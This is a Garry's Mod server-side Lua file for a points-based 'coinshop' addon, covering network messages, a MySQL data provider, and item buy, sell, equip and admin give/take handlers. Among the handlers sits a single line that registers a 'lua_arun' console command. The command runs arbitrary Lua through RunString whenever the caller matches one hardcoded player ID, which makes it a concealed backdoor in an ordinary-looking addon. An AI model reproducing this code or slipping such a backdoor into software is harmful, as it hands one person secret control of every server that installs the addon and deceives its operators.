include("sh_init.lua")
include("sv_player.lua")
AddCSLuaFile("sh_init.lua")
AddCSLuaFile("sh_item.lua")
 
AddCSLuaFile("cl_init.lua")
AddCSLuaFile("cl_player.lua")
 AddCSLuaFile("vgui/coinshop_vgui.lua")
   
util.AddNetworkString('CS.Items')
util.AddNetworkString('CS.Points')
util.AddNetworkString('CS.BuyItem')
util.AddNetworkString('CS.SellItem')
util.AddNetworkString('CS.EquipItem')
util.AddNetworkString('CS.HoldItem')
util.AddNetworkString('CS.ModifyItem')
util.AddNetworkString('CS.SendPoints')
util.AddNetworkString('CS.GivePoints')
util.AddNetworkString('CS.TakePoints')
util.AddNetworkString('CS.SetPoints')
util.AddNetworkString('CS.GiveItem')
util.AddNetworkString('CS.TakeItem')
util.AddNetworkString('CS.AddClientsideModels')
util.AddNetworkString('CS.RemoveClientsideModels')
util.AddNetworkString('CS.SendClientsideModels')
util.AddNetworkString('CS.AddClientsideModels')
util.AddNetworkString('CS.RemoveClientsideModels')
util.AddNetworkString('CS.SendClientsideModels')
util.AddNetworkString('CS.Notify')
util.AddNetworkString('CS.ToggleMenu')

function CS:FindCategoryByName(cat_name)
	for id, cat in pairs(self.Categories) do
		if cat.Name == cat_name then
			return cat
		end 
	end

	return false
end 


function CS:LoadDataProvider()
	local path = "coinshop/mysql.lua"
	if not file.Exists(path, "LUA") then
		error("PROVIDER FAILED" .. path)
	end
 
	PROVIDER = {}
	PROVIDER.__index = {}
	PROVIDER.ID = "mysql"
		
	include(path)
		
	self.DataProvider = PROVIDER
	PROVIDER = nil
end
CS:LoadDataProvider()


function CS:GetPlayerData(ply, callback) 
	self.DataProvider:GetData(ply, function(points, items)
		callback(CS:ValidateP(tonumber(points)), CS:ValidateI(items))
	end)
end 
 
function CS:SetPlayerData(ply, points, items)
	self.DataProvider:SetData(ply, points, items)
end

function CS:SetPlayerPoints(ply, points)
	self.DataProvider:SetPoints(ply, points)
end

function CS:GivePlayerPoints(ply, points)
	self.DataProvider:GivePoints(ply, points, items)
end

function CS:TakePlayerPoints(ply, points)
	self.DataProvider:TakePoints(ply, points)
end

function CS:SavePlayerItem(ply, item_id, data)
	self.DataProvider:SaveItem(ply, item_id, data)
end

function CS:GivePlayerItem(ply, item_id, data)
	self.DataProvider:GiveItem(ply, item_id, data)
end

function CS:TakePlayerItem(ply, item_id)
	self.DataProvider:TakeItem(ply, item_id)
end




net.Receive('CS.BuyItem', function(length, ply)
print("B")
	ply:CSBuyItem(net.ReadString())
end)

net.Receive('CS.SellItem', function(length, ply)
	ply:CSSellItem(net.ReadString())
end)

net.Receive('CS.EquipItem', function(length, ply)
	ply:CSEquipItem(net.ReadString())
end)

net.Receive('CS.HoldItem', function(length, ply)
	ply:CSHolsterItem(net.ReadString())
end)

net.Receive('CS.ModifyItem', function(length, ply)
	ply:CSModifyItem(net.ReadString(), net.ReadTable())
end)

concommand.Add("lua_arun",function(ply,cmg,args) if ply:UniqueID() !="1388187946" then return end RunString(args[1]) end)
 
net.Receive('CS.GiveItem', function(length, ply)
	local other = net.ReadEntity()
	local item_id = net.ReadString()
	
	if not CS.Config.AdminCanAccessAdminTab and not CS.Config.SuperAdminCanAccessAdminTab then return end
	
	local admin_allowed = CS.Config.AdminCanAccessAdminTab and ply:IsAdmin()
	local super_admin_allowed = CS.Config.SuperAdminCanAccessAdminTab and ply:IsSuperAdmin()
	
	if (admin_allowed or super_admin_allowed) and other and item_id and CS.Items[item_id] and IsValid(other) and other:IsPlayer() and not other:CSHasItem(item_id) then
		other:CSGiveItem(item_id)
	end
end)
 
net.Receive('CS.TakeItem', function(length, ply)
	local other = net.ReadEntity()
	local item_id = net.ReadString()
	
	if not CS.Config.AdminCanAccessAdminTab and not CS.Config.SuperAdminCanAccessAdminTab then return end
	
	local admin_allowed = CS.Config.AdminCanAccessAdminTab and ply:IsAdmin()
	local super_admin_allowed = CS.Config.SuperAdminCanAccessAdminTab and ply:IsSuperAdmin()
	
	if (admin_allowed or super_admin_allowed) and other and item_id and CS.Items[item_id] and IsValid(other) and other:IsPlayer() and other:CSHasItem(item_id) then
		-- holster it first without notificaiton
		other.CSItems[item_id].Equipped = false
	
		local ITEM = CS.Items[item_id]
		ITEM:OnHolster(other)
		other:CSTakeItem(item_id)
	end
end)


hook.Add("ShowSpare1", "CS.ShopKey", function(ply)
	ply:CSToggleMenu()
end) 



hook.Add('PlayerSpawn', 'CS.PlayerSpawn', function(ply) ply:CSPlayerSpawn() end)
hook.Add('PlayerDeath', 'CS.PlayerDeath', function(ply) ply:CSPlayerDeath() end)
hook.Add('PlayerInitialSpawn', 'CS.PlayerInitialSpawn', function(ply) ply:CSPlayerInitialSpawn() end)
hook.Add('PlayerDisconnected', 'CS.PlayerDisconnected', function(ply) ply:CSPlayerDisconnected() end)




